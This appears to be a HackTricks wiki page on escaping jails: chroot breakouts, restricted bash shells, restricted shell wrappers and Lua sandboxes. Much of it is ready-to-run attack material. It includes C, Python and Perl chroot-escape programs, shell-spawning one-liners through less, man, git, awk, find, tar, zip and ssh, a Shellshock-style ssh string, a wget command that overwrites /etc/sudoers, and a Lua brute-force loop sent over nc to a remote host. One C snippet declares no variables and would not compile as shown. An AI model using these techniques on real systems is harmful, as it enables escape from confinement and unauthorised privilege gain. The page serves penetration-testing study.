# Escaping from Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **if you can execute any binary with "Shell" property**

## Chroot Escapes

From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** (**root**) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.\
Usually this means that to escape you need to be root inside the chroot.<sup>[[4]](#references)</sup>

> [!TIP]
> The **tool** [**chw00t**](https://github.com/earthquake/chw00t) was created to abuse the following escenarios and scape from `chroot`.<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> If you are **root** inside a chroot you **can escape** creating **another chroot**. This because 2 chroots cannot coexists (in Linux), so if you create a folder and then **create a new chroot** on that new folder being **you outside of it**, you will now be **outside of the new chroot** and therefore you will be in the FS.
>
> This occurs because usually chroot DOESN'T move your working directory to the indicated one, so you can create a chroot but e outside of it.<sup>[[4]](#references)[[5]](#references)</sup>

Usually you won't find the `chroot` binary inside a chroot jail, but you **could compile, upload and execute** a binary:

<details>

<summary>C: break_chroot.c</summary>

```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for(int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("/bin/bash");
}
```

</details>

<details>

<summary>Python</summary>

```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
    os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```

</details>

<details>

<summary>Perl</summary>

```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
    chdir ".."
}
chroot ".";
system("/bin/bash");
```

</details>

### Root + Saved fd

> [!WARNING]
> This is similar to the previous case, but in this case the **attacker stores a file descriptor to the current directory** and then **creates the chroot in a new folder**. Finally, as he has **access** to that **FD** **outside** of the chroot, he access it and he **escapes**.<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>

```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("tmpdir", 0755);
    dir_fd = open(".", O_RDONLY);
    if(chroot("tmpdir")){
        perror("chroot");
    }
    fchdir(dir_fd);
    close(dir_fd);
    for(x = 0; x < 1000; x++) chdir("..");
    chroot(".");
}
```

</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD can be passed over Unix Domain Sockets, so:
>
> - Create a child process (fork)
> - Create UDS so parent and child can talk
> - Run chroot in child process in a different folder
> - In parent proc, create a FD of a folder that is outside of new child proc chroot
> - Pass to child procc that FD using the UDS
> - Child process chdir to that FD, and because it's ouside of its chroot, he will escape the jail.<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - Mounting root device (/) into a directory inside the chroot
> - Chrooting into that directory
>
> This is possible in Linux.<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - Mount procfs into a directory inside the chroot (if it isn't yet)
> - Look for a pid that has a different root/cwd entry, like: /proc/1/root
> - Chroot into that entry.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - Create a Fork (child proc) and chroot into a different folder deeper in the FS and CD on it
> - From the parent process, move the folder where the child process is in a folder previous to the chroot of the children
> - This children process will find himself outside of the chroot.<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - Whether a process can attach with `ptrace` depends on credentials, capabilities, and enabled security modules such as Yama; same-user debugging may therefore be restricted by system policy.<sup>[[8]](#references)</sup>
> - If attachment is permitted, you could ptrace into a process and execute a shellcode inside of it ([see this example](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Enumeration

Get info about the jail:

```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```

### Modify PATH

Check if you can modify the PATH env variable.<sup>[[2]](#references)</sup>

```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```

### Using vim

If Vim is available, set its `shell` option to a shell you can execute and invoke `:shell`.<sup>[[10]](#references)</sup>

```bash
:set shell=/bin/sh
:shell
```

### Pagers and help viewers

A lot of restricted environments still leave **pagers** or **help viewers** available. Those are usually faster to abuse than trying to rebuild `PATH`.

```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```

If `git` is available, its `--paginate` option sends output to `less` or `$PAGER`, which is useful when a pager escape is available.<sup>[[9]](#references)</sup>

```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```

### Common GTFOBins one-liners

Once you know which binaries are reachable, test the obvious shell spawners first:

```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```

If you can only **inject arguments** into an allowed command (instead of running it freely), also check **GTFOArgs**.<sup>[[17]](#references)</sup>

### Create script

Check if you can create an executable file with _/bin/bash_ as content

```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```

### Get bash from SSH

If you are accessing via ssh you can often ask the server to execute a **different program** instead of the restricted login shell.<sup>[[14]](#references)</sup>

```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```

If `ssh` is one of the few locally allowed binaries, remember that it can also be abused as a **GTFOBin**; its `LocalCommand` and `ProxyCommand` options execute locally configured helper commands.<sup>[[14]](#references)[[15]](#references)</sup>

```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```

### Declare

In Bash, a nameref redirects assignments to another variable, while adding an element to `BASH_CMDS` adds that command to Bash's internal command hash table.<sup>[[11]](#references)[[12]](#references)</sup>

```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```

### Wget

Wget's `-O` option writes downloaded content to the specified output file; if that path is writable, this can overwrite a file such as `/etc/sudoers`.<sup>[[13]](#references)</sup>

```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```

### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Some environments do not drop you into plain `rbash`, but into **wrappers** such as `git-shell`, `rssh`, or `lshell`:

- `git-shell` only accepts server-side Git commands plus anything present inside `~/git-shell-commands/`. If that directory exists, run `help` to enumerate the allowed custom actions. If you can **write** there, any executable dropped in that directory becomes reachable.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` commonly allow only `scp`, `sftp`, `rsync`, or Git-style operations. In those cases focus on **file write primitives** first: upload `authorized_keys`, a shell startup file, or a helper script into a writable location and then reconnect with `ssh -t ...`.
- If the wrapper only filters the command line, enumerate the reachable binaries and then pivot back to **GTFOBins / GTFOArgs**.

### Other tricks

Also check:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**It could also be interesting the page:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Tricks about escaping from python jails in the following page:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

In this page you can find the global functions you have access to inside lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base).<sup>[[16]](#references)</sup>

The standard `load`, `string.char`, and `os.execute` functions can build and run this chunk when they are available.<sup>[[16]](#references)</sup>

```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```

A table function can also be retrieved with `rawget` instead of dot syntax.<sup>[[16]](#references)</sup>

```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```

Use `pairs` to enumerate a library table.<sup>[[16]](#references)</sup>

```bash
for k,v in pairs(string) do print(k,v) end
```

The order in which `pairs` enumerates table indices is unspecified, so do not rely on a particular function appearing first. If you need to execute one specific function, you can perform a brute force attack by loading different lua environments and calling the first function of the library.<sup>[[16]](#references)</sup>

```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```

**Get interactive lua shell**: If you are inside a limited lua shell you can get a new lua shell (and hopefully unlimited) by calling `debug.debug()`, which enters an interactive mode.<sup>[[16]](#references)</sup>

```bash
debug.debug()
```

## References

- [1] [Chw00t: How To Break Out from Various Chroot Solutions (Bucsay Balazs, DeepSec talk and slides)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [GNU Bash Reference Manual – The Restricted Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Git Documentation](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – Linux manual page](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – chroot escape tool](https://github.com/earthquake/chw00t)
- [6] [unix(7) – Linux manual page](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – Linux manual page](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – Linux manual page](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Git Documentation](https://git-scm.com/docs/git)
- [10] [:shell – Vim documentation](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Bash Builtins – GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Bash Variables – GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [GNU Wget Manual](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – OpenBSD manual page](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – OpenBSD manual page](https://man.openbsd.org/ssh_config)
- [16] [Lua 5.4 Reference Manual](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs: Argument Injection Exploitation Vector List](https://gtfoargs.github.io/)

{{#include ../../banners/hacktricks-training.md}}
